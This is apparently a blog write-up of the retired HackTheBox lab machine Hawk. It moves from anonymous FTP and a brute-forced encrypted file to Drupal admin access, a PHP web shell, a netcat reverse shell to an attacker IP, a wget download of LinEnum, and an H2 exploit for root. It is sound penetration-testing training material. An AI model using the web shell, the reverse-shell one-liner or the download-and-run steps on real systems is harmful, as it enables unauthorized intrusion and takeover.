---
title: Hawk Hackthebox Writeup
date: 2021-01-28 04:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,h2 exploit,drupal,ftp anonymous,php filter module]     # TAG names should always be lowercase
image: /assets/img/hawk-hackthebox/hawk-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Hawk:~$


Column | Details
------------ | -------------
Name | Hawk
IP | 10.10.10.102
Points | 30
Os | Linux
Difficult | Medium
Creator | [mrh4sh](https://www.hackthebox.eu/home/users/profile/2570)
Out on | 14th July 2018

# Summary:~$

* Discovering the new host and scanning for open ports.
* Decrypting a file found by logging into `ftp` using *anonymous*:*anonymous*.
* Logging into the `drupal` cms.
* Getting reverse shell using the `php filter` module.
* Escalating privileges using `h2` exploit.

# Starting:~$

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Download link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/hawk-hackthebox/nmap-automator-1.png)

Full port scan using `nmap`: *nmap -p- -T4 -Pn -sV 10.10.10.102*

___
![](/assets/img/hawk-hackthebox/nmap-scan-1.png)

Let's check `Port 80`.

___
![](/assets/img/hawk-hackthebox/port-80-2.png)

It's a `drupal` webiste, let's check **/robots.txt**.

___
![](/assets/img/hawk-hackthebox/robots-txt-3.png)

I further accessed `http://10.10.10.102/CHANGELOG.txt` and found *drupal version* i.e. `Drupal 7.58`.

___
![](/assets/img/hawk-hackthebox/version-exposed-drupal-4.png)

I found an [exploit](https://www.exploit-db.com/exploits/44542) when googled the version vulnerabilities.

___
![](/assets/img/hawk-hackthebox/drupalexploitdb-5.png)

But it requires authentication of the user for that, let's check default credentials first on the login page. It didn't work.

`Port 21` is also open, let's try to login anonymously i.e. `anonymous`:`anonymous`.

___
![](/assets/img/hawk-hackthebox/ftp-anonymous-login-6.png)

We found a file in the directory, let's downloading it using the `get` command.

___
![](/assets/img/hawk-hackthebox/got-afile-7.png)

I opened the file and it looked like this:

___
![](/assets/img/hawk-hackthebox/opening-the-file-8.png)

As we know it's encrypted I ran `file` command on it to check for more details.

___
![](/assets/img/hawk-hackthebox/file-category-8.png)

It's a `openssl` and `base64` encrypted.

Let's decode it with base64 first.

**Command**: `cat .drupal.txt.enc | base64 --decode > drupal.txt.enc.decoded`

Now let's bruteforce the openssl file.

**Command**: *sudo apt-get install bruteforce-salted-openssl*

**Command**: *bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded*

We were unable to find the password but it showed that `sha` is `256`.

___
![](/assets/img/hawk-hackthebox/ssl-brute-force-error-9.png)

Improvising the **command**: *bruteforce-salted-openssl -d sha256 -f /usr/share/wordlists/rockyou.txt drupal.txt.enc.decoded*

We found the password as `friends`.

___
![](/assets/img/hawk-hackthebox/got-password-10.png)

Decoding the file

**Command**: *openssl aes-256-cbc -d -in drupal.txt.enc.decoded -out drupal.txt*

The digest is `SHA256` and cipher used is `AES-256-CBC` because that’s the default cipher that the program uses if it’s not specified

![](/assets/img/hawk-hackthebox/decoding-file-11.png)

We got a username and password as `Daniel`:`PencilKeyboardScanner123`.

___
![](/assets/img/hawk-hackthebox/got-new-username-password-12.png)

Let's try to login on the website using the above found credentials.

___
![](/assets/img/hawk-hackthebox/error-screenshot-13.png)

It threw me an error saying `invalid` credentials.

Let's try `admin`:`PencilKeyboardScanner123`. Successfully logged in.

___
![](/assets/img/hawk-hackthebox/loggedin-14.png)

Now in the `module` section turn on the `PHP filter`.

___
![](/assets/img/hawk-hackthebox/turn-on-php-filter-15.png)

Add a new content and add the following in the body --> `<?php system($_GET['cmd']); ?>`. Make sure to save the file with php.

___
![](/assets/img/hawk-hackthebox/add-php-content-16.png)

Accessing *http://10.10.10.102/node/1?cmd=whoami*, we got `www-data`.

___
![](/assets/img/hawk-hackthebox/command-execution-17.png)

Now let's go for the reverse shell, I used BurpSuite for it.

Check this for the [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat)

**Payload Used**: *rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.X.X 4242 >/tmp/f*

___
![](/assets/img/hawk-hackthebox/got-shell-18.png)

Got `User` Flag.

Let's send `LinEnum.sh` for escalating privileges.

**Hosting Command**: *python3 -m http.server 8081*

**wget command**: *wget http://10.10.X.X:8081/LinEnum.sh*

Ran LinEnum.sh after giving executing permissions using *chmod +x LinEnum.sh* and found this

___
![](/assets/img/hawk-hackthebox/linenum-result-19.png)

As we know `Port 8082` is running **H2 Database**, and it only allows connections locally.

___
![](/assets/img/hawk-hackthebox/port-8082-20.png)

I search for some exploits and found [this](https://www.exploit-db.com/exploits/45506)

Downloading the exploit to our victim machine using wget, and executing it we got `Root`.

____
![](/assets/img/hawk-hackthebox/got-root-21.png)

